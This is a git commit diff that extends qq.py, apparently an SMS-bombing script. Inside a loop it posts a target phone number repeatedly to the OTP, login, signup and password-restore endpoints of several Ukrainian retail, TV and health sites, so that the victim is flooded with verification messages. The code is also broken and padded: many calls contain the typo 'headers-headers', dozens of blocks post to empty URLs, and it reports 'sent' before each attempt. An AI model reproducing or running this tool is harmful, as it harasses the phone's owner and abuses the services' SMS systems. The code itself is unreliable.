7cdfc95835898841342608f0f5a691799e82187b
Hironotori <81866681+Hironotori@users.noreply.github.com>
2022-01-24 16:17:49 +0200

    Add files via upload

--- qq.py
+++ qq.py
@@ -85,5 +85,652 @@ while True:
      response = requests.post('https://megasport.ua/api/auth/phone/?language=ua', headers=headers, json={'phone' :  NUMBER})
  except:
      print('Не доставлено')
-
+ #zolotakoroleva.ua
+ try:
+     print('Отправлено')
+     response = requests.post('https://zolotakoroleva.ua/api/send-otp', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://zolotakoroleva.ua/api/send-otp', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://zolotakoroleva.ua/api/send-otp', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://zolotakoroleva.ua/api/send-otp', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#mozayka.com.ua
+ try:
+     print('Отправлено')
+     response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://mozayka.com.ua/!processing/ajax.php', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#my.xtra.tv
+ try:
+     print('Отправлено')
+     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://my.xtra.tv/api/signup?lang=uk', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#my.xtra.tv/password
+ try:
+     print('Отправлено')
+     response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://my.xtra.tv/api/password/restore?lang=uk', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#multiplex.ua
+ try:
+     print('Отправлено')
+     response = requests.post('https://auth.multiplex.ua/login', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://auth.multiplex.ua/login', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://auth.multiplex.ua/login', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://auth.multiplex.ua/login', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#helsi.me
+ try:
+     print('Отправлено')
+     response = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#ukrzoloto.ua
+ try:
+     print('Отправлено')
+     response = requests.post('https://ukrzoloto.ua/api/login', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://ukrzoloto.ua/api/login', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://ukrzoloto.ua/api/login', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('https://ukrzoloto.ua/api/login', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
+#
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, data={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers-headers, data={'phone' : NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('Не доставлено')
+	 
+ try:
+     print('Отправлено')
+     response = requests.post('', headers=headers, json={'phone' :  NUMBER})
+ except:
+     print('Не доставлено')
      time.sleep(5000)
